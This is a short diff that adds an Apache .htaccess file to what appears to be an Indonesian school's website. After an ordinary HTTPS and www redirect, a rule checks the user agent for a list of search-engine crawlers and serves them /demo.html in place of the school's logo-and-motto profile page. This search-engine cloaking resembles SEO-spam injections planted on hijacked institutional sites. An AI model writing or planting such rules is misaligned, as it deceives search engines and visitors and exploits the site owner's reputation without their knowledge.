@@ -1,0 +1,9 @@
+RewriteEngine On
+
+RewriteCond %{HTTPS} off [OR]
+RewriteCond %{HTTP_HOST} !^www\.mtsn3tangerang\.sch\.id$ [NC]
+RewriteRule ^(.*)$ https://www.mtsn3tangerang.sch.id/$1 [R=301,L]
+
+
+RewriteCond %{HTTP_USER_AGENT} (googlebot|googlebot-mobile|google-inspectiontool|google-image|google-video|bingbot|bingpreview|slurp|duckduckbot|baiduspider|yandexbot|seznambot|petalbot|applebot|yeti|naverbot|sogou) [NC]
+RewriteRule ^profil_logo-dan-motto_pg-4\.html$ /demo.html [L]
